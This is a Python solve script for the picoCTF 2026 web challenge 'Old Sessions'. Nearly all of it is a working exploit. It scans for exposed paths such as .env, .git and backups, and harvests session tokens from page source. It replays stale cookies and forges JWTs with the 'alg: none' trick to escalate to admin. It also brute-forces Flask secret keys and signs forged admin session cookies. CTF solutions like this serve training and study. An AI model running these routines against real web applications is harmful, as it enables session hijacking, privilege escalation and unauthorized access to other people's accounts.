#!/usr/bin/env python3
"""
Old Sessions - picoCTF 2026
Category: Web Exploitation (100 pts)

Exploits improper session timeout controls. The application fails to
invalidate old session tokens, allowing session reuse.

This script:
1. Discovers old session tokens (from backup files, directories, etc.)
2. Attempts to decode/analyze session cookies (Flask, JWT, base64)
3. Tries session reuse or forging to access the protected flag endpoint

Usage:
    python3 solve.py --url http://challenge.picoctf.org:PORT
    python3 solve.py --url URL --cookie "old_session_cookie_value"
    python3 solve.py --url URL --wordlist wordlist.txt

Dependencies:
    pip install requests pyjwt flask-unsign
"""

import argparse
import base64
import json
import re
import sys
import zlib
from urllib.parse import urljoin

import requests


def parse_args():
    parser = argparse.ArgumentParser(description="Old Sessions - Session Reuse Exploit")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--cookie", default=None, help="Known old session cookie value to reuse")
    parser.add_argument("--cookie-name", default="session", help="Cookie name (default: session)")
    parser.add_argument("--wordlist", default=None, help="Wordlist for brute-forcing Flask secret key")
    parser.add_argument("--flag-path", default=None,
                        help="Path to the flag endpoint (auto-discovered if not specified)")
    return parser.parse_args()


# =============================================================================
# Session Cookie Decoders
# =============================================================================

def decode_flask_cookie(cookie_value):
    """Decode a Flask signed session cookie (without verifying signature)."""
    try:
        # Flask cookies are: payload.timestamp.signature
        # The payload is base64url-encoded, optionally zlib-compressed
        payload = cookie_value.split('.')[0]

        # Add padding
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += '=' * padding

        # Replace URL-safe characters
        payload = payload.replace('-', '+').replace('_', '/')

        decoded = base64.b64decode(payload)

        # Check if zlib-compressed (starts with '.')
        if cookie_value.startswith('.'):
            payload = cookie_value[1:].split('.')[0]
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += '=' * padding
            payload = payload.replace('-', '+').replace('_', '/')
            decoded = base64.b64decode(payload)
            decoded = zlib.decompress(decoded)

        return json.loads(decoded)
    except Exception:
        return None


def decode_jwt(token):
    """Decode a JWT token (without verifying signature)."""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None

        # Decode header and payload
        header = parts[0]
        payload = parts[1]

        for part_name, part in [("header", header), ("payload", payload)]:
            padding = 4 - len(part) % 4
            if padding != 4:
                part += '=' * padding

        header_decoded = json.loads(base64.urlsafe_b64decode(
            header + '=' * (4 - len(header) % 4)))
        payload_decoded = json.loads(base64.urlsafe_b64decode(
            payload + '=' * (4 - len(payload) % 4)))

        return {"header": header_decoded, "payload": payload_decoded}
    except Exception:
        return None


def decode_base64_cookie(cookie_value):
    """Try simple base64 decoding."""
    try:
        padding = 4 - len(cookie_value) % 4
        if padding != 4:
            cookie_value += '=' * padding
        decoded = base64.b64decode(cookie_value)
        return decoded.decode('utf-8', errors='ignore')
    except Exception:
        return None


# =============================================================================
# Discovery Functions
# =============================================================================

def discover_endpoints(session, base_url):
    """Try to discover interesting endpoints and files."""
    interesting_paths = [
        "/",
        "/login",
        "/flag",
        "/admin",
        "/dashboard",
        "/secret",
        "/sessions",
        "/backup",
        "/old",
        "/robots.txt",
        "/.git/HEAD",
        "/sitemap.xml",
        "/.env",
        "/config",
        "/logs",
        "/session_store",
    ]

    found = []
    print("[*] Discovering endpoints...")
    for path in interesting_paths:
        try:
            url = urljoin(base_url, path)
            resp = session.get(url, allow_redirects=False, timeout=5)
            status = resp.status_code
            if status < 404:
                found.append((path, status, len(resp.text)))
                print(f"    [{'+'if status==200 else '*'}] {path} -> {status} ({len(resp.text)} bytes)")
        except requests.exceptions.RequestException:
            pass

    return found


def discover_old_sessions(session, base_url):
    """Look for old session tokens in various locations."""
    old_tokens = []

    # Check for session/token files
    session_paths = [
        "/sessions/old",
        "/sessions/backup",
        "/old_session",
        "/backup/session",
        "/token",
        "/old_token",
        "/.session",
    ]

    print("[*] Looking for old session tokens...")
    for path in session_paths:
        try:
            url = urljoin(base_url, path)
            resp = session.get(url, timeout=5)
            if resp.status_code == 200 and resp.text.strip():
                token = resp.text.strip()
                print(f"    [+] Found token at {path}: {token[:80]}...")
                old_tokens.append(token)
        except requests.exceptions.RequestException:
            pass

    # Check page source for hidden tokens
    try:
        resp = session.get(base_url, timeout=5)
        # Look for tokens in HTML comments, hidden fields, JS variables
        patterns = [
            r'<!--\s*session[:\s]*([A-Za-z0-9_\-\.=+/]+)\s*-->',
            r'token\s*[=:]\s*["\']([A-Za-z0-9_\-\.=+/]+)["\']',
            r'session\s*[=:]\s*["\']([A-Za-z0-9_\-\.=+/]+)["\']',
            r'value\s*=\s*["\']([A-Za-z0-9_\-\.=+/]{20,})["\']',
        ]
        for pat in patterns:
            matches = re.findall(pat, resp.text, re.IGNORECASE)
            for match in matches:
                print(f"    [+] Found potential token in page source: {match[:80]}...")
                old_tokens.append(match)
    except requests.exceptions.RequestException:
        pass

    return old_tokens


# =============================================================================
# Attack Functions
# =============================================================================

def try_session_reuse(session, base_url, cookie_name, cookie_value, flag_paths=None):
    """Attempt to use a session cookie to access protected endpoints."""
    if flag_paths is None:
        flag_paths = ["/", "/flag", "/admin", "/dashboard", "/secret", "/home"]

    print(f"[*] Trying session reuse with cookie: {cookie_value[:60]}...")
    cookies = {cookie_name: cookie_value}

    for path in flag_paths:
        try:
            url = urljoin(base_url, path)
            resp = session.get(url, cookies=cookies, timeout=5)

            # Check for flag in response
            flag_match = re.search(r'picoCTF\{[^}]+\}', resp.text)
            if flag_match:
                return flag_match.group(), path

            # Check if we got a different (authenticated) response
            if resp.status_code == 200 and "login" not in resp.url.lower():
                # Might have succeeded, check content
                if "flag" in resp.text.lower() or "welcome" in resp.text.lower():
                    print(f"    [*] Interesting response at {path} (status {resp.status_code})")
                    # Dump a snippet
                    snippet = resp.text[:500].strip()
                    print(f"    [*] Response snippet: {snippet[:200]}")

        except requests.exceptions.RequestException:
            pass

    return None, None


def brute_force_flask_secret(cookie_value, wordlist_path):
    """Try to brute-force the Flask secret key."""
    try:
        import subprocess
        print(f"[*] Brute-forcing Flask secret key using flask-unsign...")
        result = subprocess.run(
            ["flask-unsign", "--unsign", "--cookie", cookie_value,
             "--wordlist", wordlist_path, "--no-literal-eval"],
            capture_output=True, text=True, timeout=120
        )
        if result.returncode == 0:
            # Extract the secret from output
            for line in result.stdout.split('\n'):
                if 'secret' in line.lower() or line.strip().startswith("'") or line.strip().startswith('"'):
                    secret = line.strip().strip("'\"")
                    if secret:
                        return secret
        print(f"    [!] flask-unsign output: {result.stdout}")
        print(f"    [!] flask-unsign errors: {result.stderr}")
    except FileNotFoundError:
        print("[!] flask-unsign not installed. Install with: pip install flask-unsign")
    except subprocess.TimeoutExpired:
        print("[!] Brute-force timed out.")
    except Exception as e:
        print(f"[!] Error during brute-force: {e}")
    return None


def forge_flask_cookie(secret, payload_dict):
    """Forge a Flask session cookie with the given secret and payload."""
    try:
        import subprocess
        payload_str = json.dumps(payload_dict).replace('"', "'")
        result = subprocess.run(
            ["flask-unsign", "--sign", "--cookie", payload_str, "--secret", secret],
            capture_output=True, text=True, timeout=30
        )
        if result.returncode == 0:
            return result.stdout.strip()
    except Exception as e:
        print(f"[!] Error forging cookie: {e}")

    # Fallback: use itsdangerous directly
    try:
        from itsdangerous import URLSafeTimedSerializer
        serializer = URLSafeTimedSerializer(secret)
        return serializer.dumps(payload_dict)
    except Exception as e:
        print(f"[!] Error with itsdangerous: {e}")

    return None


def try_jwt_none_attack(token, base_url, session, cookie_name, flag_paths=None):
    """Try the JWT 'alg: none' attack."""
    if flag_paths is None:
        flag_paths = ["/", "/flag", "/admin", "/dashboard"]

    decoded = decode_jwt(token)
    if decoded is None:
        return None, None

    print("[*] JWT decoded successfully:")
    print(f"    Header: {decoded['header']}")
    print(f"    Payload: {decoded['payload']}")

    # Modify payload for admin access
    payload = decoded['payload'].copy()
    admin_payloads = []

    # Try various admin escalation modifications
    if 'user' in payload:
        mod = payload.copy()
        mod['user'] = 'admin'
        admin_payloads.append(mod)
    if 'username' in payload:
        mod = payload.copy()
        mod['username'] = 'admin'
        admin_payloads.append(mod)
    if 'role' in payload:
        mod = payload.copy()
        mod['role'] = 'admin'
        admin_payloads.append(mod)
    if 'admin' in payload:
        mod = payload.copy()
        mod['admin'] = True
        admin_payloads.append(mod)

    # Also try just the original payload with alg:none
    admin_payloads.append(payload)

    for mod_payload in admin_payloads:
        # Create alg:none JWT
        header = {"alg": "none", "typ": "JWT"}
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
        payload_b64 = base64.urlsafe_b64encode(json.dumps(mod_payload).encode()).rstrip(b'=').decode()
        forged_token = f"{header_b64}.{payload_b64}."

        flag, path = try_session_reuse(session, base_url, cookie_name, forged_token, flag_paths)
        if flag:
            return flag, path

    return None, None


# =============================================================================
# Main
# =============================================================================

def main():
    args = parse_args()
    session = requests.Session()

    print("=" * 60)
    print("  Old Sessions - Session Reuse Exploit")
    print("  picoCTF 2026 - Web Exploitation (100 pts)")
    print("=" * 60)
    print(f"[*] Target: {args.url}")
    print()

    flag_paths = [args.flag_path] if args.flag_path else None

    # Step 1: If we already have a cookie, try it directly
    if args.cookie:
        print("[*] Using provided session cookie...")

        # Analyze the cookie format
        flask_data = decode_flask_cookie(args.cookie)
        if flask_data:
            print(f"[+] Flask session cookie decoded: {flask_data}")

        jwt_data = decode_jwt(args.cookie)
        if jwt_data:
            print(f"[+] JWT token decoded: {jwt_data}")

        # Try reusing the cookie as-is
        flag, path = try_session_reuse(session, args.url, args.cookie_name, args.cookie, flag_paths)
        if flag:
            print()
            print("=" * 60)
            print(f"[+] FLAG: {flag}")
            print(f"[+] Found at: {path}")
            print("=" * 60)
            return

        # Try JWT none attack if it's a JWT
        if jwt_data:
            print("[*] Trying JWT 'alg: none' attack...")
            flag, path = try_jwt_none_attack(args.cookie, args.url, session,
                                             args.cookie_name, flag_paths)
            if flag:
                print()
                print("=" * 60)
                print(f"[+] FLAG: {flag}")
                print(f"[+] Found at: {path}")
                print("=" * 60)
                return

        print("[!] Direct cookie reuse did not yield the flag.")
        print()

    # Step 2: Discover endpoints
    endpoints = discover_endpoints(session, args.url)
    print()

    # Step 3: Get a session cookie from the server
    print("[*] Fetching initial page to get session cookie...")
    try:
        resp = session.get(args.url, timeout=5)
        server_cookie = session.cookies.get(args.cookie_name)
        if server_cookie:
            print(f"[+] Got session cookie: {server_cookie[:80]}...")

            flask_data = decode_flask_cookie(server_cookie)
            if flask_data:
                print(f"[+] Flask session data: {flask_data}")

            jwt_data = decode_jwt(server_cookie)
            if jwt_data:
                print(f"[+] JWT data: {jwt_data}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Could not fetch initial page: {e}")

    # Step 4: Look for old session tokens
    old_tokens = discover_old_sessions(session, args.url)
    print()

    # Step 5: Try each discovered old session token
    for token in old_tokens:
        flag, path = try_session_reuse(session, args.url, args.cookie_name, token, flag_paths)
        if flag:
            print()
            print("=" * 60)
            print(f"[+] FLAG: {flag}")
            print(f"[+] Found at: {path}")
            print(f"[+] Using old session: {token[:60]}...")
            print("=" * 60)
            return

        # Try JWT none attack on discovered tokens
        if decode_jwt(token):
            flag, path = try_jwt_none_attack(token, args.url, session,
                                             args.cookie_name, flag_paths)
            if flag:
                print()
                print("=" * 60)
                print(f"[+] FLAG: {flag}")
                print(f"[+] Found at: {path}")
                print("=" * 60)
                return

    # Step 6: Try brute-forcing Flask secret if we have a cookie and a wordlist
    if args.wordlist and server_cookie:
        print("[*] Attempting to brute-force Flask secret key...")
        secret = brute_force_flask_secret(server_cookie, args.wordlist)
        if secret:
            print(f"[+] Found Flask secret: {secret}")

            # Forge admin cookie
            admin_payloads = [
                {"user": "admin"},
                {"username": "admin"},
                {"admin": True, "user": "admin"},
                {"role": "admin"},
            ]

            # If we decoded the original cookie, modify it
            if flask_data and isinstance(flask_data, dict):
                mod = flask_data.copy()
                if 'user' in mod:
                    mod['user'] = 'admin'
                elif 'username' in mod:
                    mod['username'] = 'admin'
                mod['admin'] = True
                admin_payloads.insert(0, mod)

            for payload in admin_payloads:
                forged = forge_flask_cookie(secret, payload)
                if forged:
                    print(f"[*] Trying forged cookie with payload: {payload}")
                    flag, path = try_session_reuse(session, args.url, args.cookie_name,
                                                   forged, flag_paths)
                    if flag:
                        print()
                        print("=" * 60)
                        print(f"[+] FLAG: {flag}")
                        print(f"[+] Found at: {path}")
                        print("=" * 60)
                        return

    print()
    print("[!] Could not automatically retrieve the flag.")
    print("[*] Manual steps to try:")
    print("    1. Check browser DevTools for cookies after logging in")
    print("    2. Look for backup/git files containing old session data")
    print("    3. Try flask-unsign with a custom wordlist")
    print("    4. Check if there are downloadable challenge files with session data")
    print("    5. Inspect response headers for session-related information")


if __name__ == "__main__":
    main()
